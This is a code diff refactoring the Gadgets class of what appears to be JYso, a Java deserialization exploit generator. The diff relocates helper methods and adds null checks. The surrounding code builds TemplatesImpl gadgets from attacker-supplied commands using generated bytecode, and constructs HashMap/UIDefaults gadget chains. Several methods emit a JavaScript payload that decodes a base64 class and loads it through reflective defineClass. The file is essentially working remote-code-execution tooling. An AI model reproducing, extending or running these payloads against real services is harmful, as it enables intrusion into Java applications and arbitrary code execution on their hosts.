@@ -1,20 +1,20 @@
 package com.qi4l.JYso.gadgets.utils;
 
+import com.qi4l.JYso.gadgets.JDKUtil;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassClassPath;
 import javassist.CtClass;
 import javassist.CtConstructor;
-import sun.misc.Unsafe;
 
 import java.lang.reflect.*;
 import java.util.Base64;
 import java.util.HashMap;
-import java.util.Hashtable;
 import java.util.Map;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
 import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassFieldHandler.insertField;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertCMD;
@@ -25,9 +25,9 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 
 public class Gadgets extends ClassLoader {
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-    public static Class TPL_CLASS = TemplatesImpl.class;
-    public static Class ABST_TRANSLET = AbstractTranslet.class;
-    public static Class TRANS_FACTORY = TransformerFactoryImpl.class;
+    public static Class<?> TPL_CLASS = TemplatesImpl.class;
+    public static Class<?> ABST_TRANSLET = AbstractTranslet.class;
+    public static Class<?> TRANS_FACTORY = TransformerFactoryImpl.class;
 
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
@@ -57,32 +57,8 @@ public class Gadgets extends ClassLoader {
     }
 
 
-    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
-        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[0] = iface;
-        if (ifaces.length > 0) {
-            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
-        }
-        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
-    }
-
-
     public static Map<String, Object> createMap(final String key, final Object val) {
-        final Map<String, Object> map = new HashMap<String, Object>();
-        map.put(key, val);
-        return map;
-    }
-
-    private static void patchModule(Class clazz, Class goalclass) {
-        try {
-            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
-            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
-            unsafeField.setAccessible(true);
-            Unsafe unsafe = (Unsafe) unsafeField.get(null);
-            Object ObjectModule = Class.class.getMethod("getModule").invoke(goalclass);
-            unsafe.getAndSetObject(clazz, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), ObjectModule);
-        } catch (Exception e) {
-        }
+        return JDKUtil.createMap(key, val);
     }
 
     public static Object createTemplatesImpl(String command) throws Exception {
@@ -93,14 +69,14 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass = null;
+        CtClass ctClass;
         byte[] classBytes = new byte[0];
         String newClassName = generateClassName();
 
 
         final Object templates = TPL_CLASS.newInstance();
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
-        CtClass superClass = POOL.get(ABST_TRANSLET.getName());
+        POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
         if (command.startsWith("EX-") || command.startsWith("LF-")) {
@@ -124,21 +100,22 @@ public class Gadgets extends ClassLoader {
 
         // 如果全局配置继承，再设置父类
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            shrinkBytes(ctClass);
+            if (ctClass != null) {
+                shrinkBytes(ctClass);
+            }
 
             // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
+            // 否则直接设置父类
+            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                 ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
-            } else {
-                // 否则直接设置父类
-                ctClass.defrost();
-                ctClass.setSuperclass(superClass);
             }
         }
 
         // 按需保存文件
         saveCtClassToFile(ctClass);
-        classBytes = ctClass.toBytecode();
+        if (ctClass != null) {
+            classBytes = ctClass.toBytecode();
+        }
 
         // 加载 class 试试
 //		loadClassTest(classBytes, ctClass.getName());
@@ -172,11 +149,11 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass = null;
+        CtClass ctClass;
         String newClassName = generateClassName();
 
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
-        CtClass superClass = POOL.get(ABST_TRANSLET.getName());
+        POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
         if (command.startsWith("EX-") || command.startsWith("LF-")) {
@@ -200,34 +177,41 @@ public class Gadgets extends ClassLoader {
 
         // 如果全局配置继承，再设置父类
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            shrinkBytes(ctClass);
+            if (ctClass != null) {
+                shrinkBytes(ctClass);
+            }
 
             // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
+            // 否则直接设置父类
+            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                 ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
-            } else {
-                // 否则直接设置父类
-                ctClass.defrost();
-                ctClass.setSuperclass(superClass);
             }
         }
 
-        byte[] bytes = ctClass.toBytecode();
+        byte[] bytes = null;
+        if (ctClass != null) {
+            bytes = ctClass.toBytecode();
+        }
         String classCode = Base64.getEncoder().encodeToString(bytes);
         //System.out.println("Base64 Encoded CtClass: " + classCode);
-        ctClass.detach();
+        if (ctClass != null) {
+            ctClass.detach();
+        }
 
-        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
-                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
-                "try{\n" +
-                "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
-                "   clazz.newInstance();\n" +
-                "}catch(err){\n" +
-                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
-                "   method.setAccessible(true);\n" +
-                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                "   clazz.newInstance();\n" +
-                "};";
+        if (ctClass != null) {
+            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
+                    "try{\n" +
+                    "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
+                    "   clazz.newInstance();\n" +
+                    "}catch(err){\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   method.setAccessible(true);\n" +
+                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                    "   clazz.newInstance();\n" +
+                    "};";
+        }
+        return newClassName;
     }
 
     public static String createClassB(String command) throws Exception {
@@ -238,11 +222,11 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass = null;
+        CtClass ctClass;
         String newClassName = generateClassName();
 
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
-        CtClass superClass = POOL.get(ABST_TRANSLET.getName());
+        POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
         if (command.startsWith("EX-") || command.startsWith("LF-")) {
@@ -266,72 +250,40 @@ public class Gadgets extends ClassLoader {
 
         // 如果全局配置继承，再设置父类
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            shrinkBytes(ctClass);
+            if (ctClass != null) {
+                shrinkBytes(ctClass);
+            }
 
             // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
+            // 否则直接设置父类
+            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                 ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
-            } else {
-                // 否则直接设置父类
-                ctClass.defrost();
-                ctClass.setSuperclass(superClass);
             }
         }
 
-        String className = ctClass.getName();
-        ctClass.writeFile();
+        String className = null;
+        if (ctClass != null) {
+            className = ctClass.getName();
+        }
+        if (ctClass != null) {
+            ctClass.writeFile();
+        }
 
         //writeClassToFile(className, ctClass.toBytecode());
 
         return className;
     }
 
-    public static HashMap makeMap(Object v1, Object v2) throws Exception {
-        HashMap s = new HashMap();
-        Reflections.setFieldValue(s, "size", 2);
-        Class nodeC;
-        try {
-            nodeC = Class.forName("java.util.HashMap$Node");
-        } catch (ClassNotFoundException e) {
-            nodeC = Class.forName("java.util.HashMap$Entry");
-        }
-        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
-        Reflections.setAccessible(nodeCons);
-
-        Object tbl = Array.newInstance(nodeC, 2);
-        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
-        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
-        Reflections.setFieldValue(s, "table", tbl);
-        return s;
-    }
-
-    public static Hashtable makeTableTstring(Object o) throws Exception {
-        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        tHashMap1.put(o, "Unam4");
-        tHashMap2.put(o, "SpringKill");
-        Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
-        Reflections.setFieldValue(tHashMap2, "loadFactor", 1);
-
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(tHashMap1, "Unam4");
-        hashtable.put(tHashMap2, "SpringKill");
-
-        tHashMap1.put(o, null);
-        tHashMap2.put(o, null);
-        return hashtable;
-    }
-
-    public static HashMap maskmapToString(Object o1, Object o2) throws Exception {
-        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+    public static HashMap<Object,?> maskmapToString(Object o1, Object o2) throws Exception {
+        Map<Object,?> tHashMap1 = (Map<Object,?>) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Map<Object,?> tHashMap2 = (Map<Object,?>) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
         tHashMap1.put(o1, null);
         tHashMap2.put(o2, null);
         Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
         Reflections.setFieldValue(tHashMap2, "loadFactor", 1);
-        HashMap hashMap = new HashMap();
-        Class node = Class.forName("java.util.HashMap$Node");
-        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
+        HashMap<Object,?> hashMap = new HashMap<>();
+        Class<?> node = Class.forName("java.util.HashMap$Node");
+        Constructor<?> constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
         constructor.setAccessible(true);
         Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
         Object node2 = constructor.newInstance(0, tHashMap2, "SpringKill", null);
